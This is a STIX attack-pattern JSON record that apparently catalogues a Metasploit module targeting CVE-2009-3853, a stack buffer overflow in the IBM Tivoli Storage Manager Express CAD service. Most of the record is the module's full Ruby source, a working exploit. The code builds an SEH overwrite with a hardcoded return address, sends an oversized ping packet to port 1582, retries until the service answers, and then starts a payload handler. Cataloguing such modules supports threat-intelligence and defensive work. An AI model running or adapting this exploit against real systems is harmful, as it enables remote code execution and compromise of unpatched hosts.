{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4d6be34-4e22-4cd3-a2d2-7ef3987a71de",
    "created": "2024-08-14T16:45:45.790825Z",
    "modified": "2024-08-14T16:45:45.79083Z",
    "name": "IBM Tivoli Storage Manager Express CAD Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service. By sending a \"ping\" packet containing a long string, an attacker can execute arbitrary code.  NOTE: the dsmcad.exe service must be in a particular state (CadWaitingStatus = 1) in order for the vulnerable code to be reached. This state doesn't appear to be reachable when the TSM server is not running. This service does not restart. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ibm_tsm_cad_ping.rb",
            "external_id": "ibm_tsm_cad_ping.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3853"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Tivoli Storage Manager Express CAD Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service.\n        By sending a \"ping\" packet containing a long string, an attacker can execute arbitrary code.\n\n        NOTE: the dsmcad.exe service must be in a particular state (CadWaitingStatus = 1) in order\n        for the vulnerable code to be reached. This state doesn't appear to be reachable when the\n        TSM server is not running. This service does not restart.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-3853' ],\n          [ 'OSVDB', '59632' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 380, # offset to seh is 384\n          'BadChars' => '', # none!\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # this target should be pretty universal..\n          # dbghelp.dll is shipped with TSM Express, and hasn't been kept up-to-date..\n          [ 'IBM Tivoli Storage Manager Express 5.3.6.2', { 'Ret' => 0x028495d3 } ], # p/p/r dbghelp.dll v6.0.17.0\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-04'))\n\n    register_options( [ Opt::RPORT(1582) ])\n  end\n\n  def exploit\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    # wchar_t buf[64];\n\n    #print_status(\"Generating sploit data...\")\n    distance = payload_space + 8\n    backjmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n    copy_len = distance + backjmp.length + (1024*3)\n\n    sploit = [0,copy_len].pack('n*')\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret)\n    sploit << backjmp\n    # force hitting end of the stack\n    sploit << rand_text(1024) * 3\n\n    data = [sploit.length,0x26,0xa5].pack('nCC')\n    data << sploit\n\n    got_it = false\n    while not got_it\n      connect\n      print_status(\"Sending nasty ping request...\")\n      sock.put(data)\n\n      begin\n        buf = sock.get_once(-1, 5)\n      rescue\n        print_status(\"Hrm, the service is probably in the wrong state, stand by...\")\n        disconnect\n        select(nil, nil, nil, 5)\n        next\n      end\n      got_it = true\n    end\n\n    print_status(\"Starting handler...\")\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-04",
    "x_mitre_platforms": [
        "win'"
    ]
}